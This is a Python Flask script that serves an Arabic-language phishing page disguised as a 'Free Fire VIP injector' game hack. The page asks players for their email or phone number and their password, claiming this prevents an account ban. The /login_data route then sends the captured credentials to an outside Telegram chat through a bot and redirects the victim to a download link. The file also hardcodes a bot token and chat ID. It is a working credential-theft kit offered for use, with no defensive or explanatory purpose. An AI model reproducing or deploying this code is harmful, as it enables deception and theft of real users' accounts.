import telebot
from flask import Flask, request, render_template_string
import os

# --- بياناتك ---
TOKEN = "8195744080:AAHrjFbYsoAvm4Oi2EhJI09KShSvp3G76Vc"
CHAT_ID = "8362370478"
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# --- رابط التحميل المباشر الخاص بك ---
DOWNLOAD_LINK = "https://www.mediafire.com/your_file_link" 

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena Free Fire - VIP Injector</title>
    <style>
        :root { --main-color: #9d4edd; --bg-dark: #0f0c29; }
        body {
            margin: 0; padding: 0;
            background: linear-gradient(to bottom, #0f0c29, #302b63, #24243e);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: white; display: flex; justify-content: center; align-items: center; height: 100vh;
        }
        .container {
            width: 90%; max-width: 400px;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px; padding: 30px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
            text-align: center;
        }
        .status-bar {
            background: rgba(0, 255, 127, 0.1);
            color: #00ff7f; padding: 5px 15px;
            border-radius: 50px; font-size: 12px;
            display: inline-block; margin-bottom: 20px;
            border: 1px solid #00ff7f;
        }
        h2 { margin: 0; color: #fff; font-size: 24px; text-shadow: 0 0 10px var(--main-color); }
        p { color: #ccc; font-size: 14px; margin-top: 5px; }
        
        .input-group { margin-top: 25px; text-align: right; }
        label { display: block; margin-bottom: 5px; font-size: 13px; color: var(--main-color); margin-right: 10px;}
        input {
            width: 100%; padding: 12px 15px;
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 10px; color: white;
            box-sizing: border-box; outline: none; transition: 0.3s;
        }
        input:focus { border-color: var(--main-color); box-shadow: 0 0 10px var(--main-color); }
        
        .btn {
            margin-top: 30px; width: 100%; padding: 15px;
            background: linear-gradient(45deg, #7b2ff7, #9d4edd);
            border: none; border-radius: 10px;
            color: white; font-weight: bold; font-size: 16px;
            cursor: pointer; transition: 0.3s;
            box-shadow: 0 5px 15px rgba(157, 78, 221, 0.4);
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(157, 78, 221, 0.6); }
        
        .footer-note { margin-top: 20px; font-size: 11px; color: #777; }
        .secure-icon { vertical-align: middle; width: 14px; margin-left: 5px; }
    </style>
</head>
<body>

<div class="container">
    <div class="status-bar">● السيرفر متصل: V2.8 Stable</div>
    <h2>تفعيل نظام الاختراق VIP</h2>
    <p>قم بتأكيد هويتك لربط الـ ID ومنع حظر الحساب</p>

    <div class="input-group">
        <label>البريد الإلكتروني / رقم الهاتف</label>
        <input type="text" id="email" placeholder="example@mail.com" required>
    </div>

    <div class="input-group">
        <label>كلمة المرور السرية</label>
        <input type="password" id="pass" placeholder="••••••••" required>
    </div>

    <button class="btn" onclick="sendData()">ربط الحساب وتحميل الهاك</button>

    <div class="footer-note">
        <img src="https://img.icons8.com/ios-filled/50/777777/shield.png" class="secure-icon">
        اتصال مشفر 256-bit SSL للحماية من الباند
    </div>
</div>

<script>
function sendData() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;
    
    if(email.length < 5 || pass.length < 4) {
        alert("خطأ: يرجى إدخال بيانات صحيحة للربط!");
        return;
    }

    // إرسال البيانات
    fetch('/login_data', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({u: email, p: pass})
    }).then(() => {
        // التحويل للرابط
        window.location.href = "{{ download_url }}";
    });
}
</script>

</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_PAGE, download_url=DOWNLOAD_LINK)

@app.route('/login_data', methods=['POST'])
def login_data():
    data = request.json
    msg = f"🎯 **صيد VIP جديد!**\\n\\n👤 الحساب: `{data['u']}`\\n🔑 الباسورد: `{data['p']}`"
    bot.send_message(CHAT_ID, msg, parse_mode="Markdown")
    return "ok"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
